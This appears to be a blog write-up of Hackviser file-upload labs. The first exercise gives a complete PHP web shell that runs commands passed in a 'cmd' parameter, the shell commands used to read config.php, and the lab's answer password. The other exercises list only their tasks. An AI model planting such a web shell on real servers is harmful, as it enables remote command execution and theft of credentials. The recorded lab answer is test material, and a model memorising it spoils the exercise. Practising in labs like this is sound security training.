---
title: 'Unrestricted File Upload'
date: '2026-03-01'
excerpt: 'Practice Unrestricted File Upload attacks in multiple lab exercises.'
prog: 'Hackviser Web Application Security Labs  -  March 2026'
---

<div class="writeup-header">
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_logo.png" alt="Hackviser logo" class="writeup-logo" />
<div class="writeup-header-text">
<div class="writeup-org">Hackviser</div>
<h1 class="writeup-title">Unrestricted File Upload</h1>
<div class="writeup-date">April 2026 · Web Application Security Labs</div>
</div>
</div>
<p class="lead mb-4">Practice unrestricted file upload attacks in multiple lab exercises.</p>

<h5 class="mb-2">1. Basic Unrestricted File Upload</h5>
<p class="mb-3"><strong>This lab contains a Unrestricted File Upload vulnerability. The application has an image upload function, but the uploaded file content or type is not checked on the server. To complete the lab, upload a malicious PHP script and read the "config.php" file. What is the database password in the config.php file?</strong></p>
<p class="mb-3">We will create a simple PHP web shell using the following code and upload it.</p>
<pre>&lt;html&gt;
&lt;body&gt;
&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&apos;PHP_SELF&apos;]); ?&gt;&quot;&gt;
&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
&lt;/form&gt;
&lt;pre&gt;
&lt;?php
    if(isset($_GET[&apos;cmd&apos;]))
    {
        system($_GET[&apos;cmd&apos;] . &apos; 2&gt;&amp;1&apos;);
    }
?&gt;
&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image1.png" alt="Web Application Security Unrestricted File Upload 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Once uploaded, click on the file path shown and enter the command <code>pwd</code>. The results should show <code>/var/www/html/uploads</code>. Since HTTP is stateless, everytime we send a commmand through a basic PHP web shell, it starts a brand-new process from scratch. This is why we need to use <code>cd .. && ls</code> to execute both commands within the same shell session. The output is seen below.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image2.png" alt="Web Application Security Unrestricted File Upload 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-3">Now that we have confirmed where the config.php file is located, we can run the command <code>cat ../config.php</code>. Browsers try to render the <code>&lt;?php</code> as invisible HTML tags which hides the content. Viewing the page source in a new tab solves this problem.</p>
<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image3.png" alt="Web Application Security Unrestricted File Upload 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
<p class="mb-5"><strong>Answer:</strong> 8jv77mvXwR7LVU5v</p>
<br />

<h5 class="mb-2">2. MIME Type Filter Bypass</h5>
<p class="mb-3"><strong>This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the Mime-Type. To complete the lab, upload a malicious PHP script by changing the Mime-Type and read the "config.php" file. What is the database password in the config.php file?</strong></p>
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h5 class="mb-2">3. File Signature Filter Bypass</h5>
<p class="mb-3"><strong>This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file signature (a.k.a magic bytes). To complete the lab, upload a malicious PHP script by manipulating the file signature and read the "config.php" file. What is the database password in the config.php file?</strong></p>
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h5 class="mb-2">4. File Extension Filter Bypass</h5>
<p class="mb-3"><strong>This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Many file extensions that are dangerous to upload are included in this blacklist. To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file. What is the database password in the config.php file?</strong></p>
<p class="mb-5"><strong>Answer:</strong> </p>
<br />

<h5 class="mb-2">5. File Extension Improved Filter Bypass</h5>
<p class="mb-3"><strong>This lab contains an unrestricted file upload vulnerability. The image upload function in the application filters uploaded files based on the file extension blacklist. Almost all file extensions that are dangerous to upload are included in this blacklist. To complete the lab, find a file extension that is not on the blacklist and upload the malicious PHP file with that extension, then read the "config.php" file. What is the database password in the config.php file?</strong></p>
<p class="mb-5"><strong>Answer:</strong> </p>


<hr />
<section class="text-center" style="margin-top:1.5rem; margin-bottom:1.5rem;">
<p class="mb-1" style="font-style:italic; font-size:1.125rem;">See you in the next Hacking Lab.</p>
<p class="mb-0" style="font-weight:700;">@aaronamran</p>
<p class="text-muted small mt-1">April 2026</p>
</section>

<div class="writeup-nav">
</div>
</div>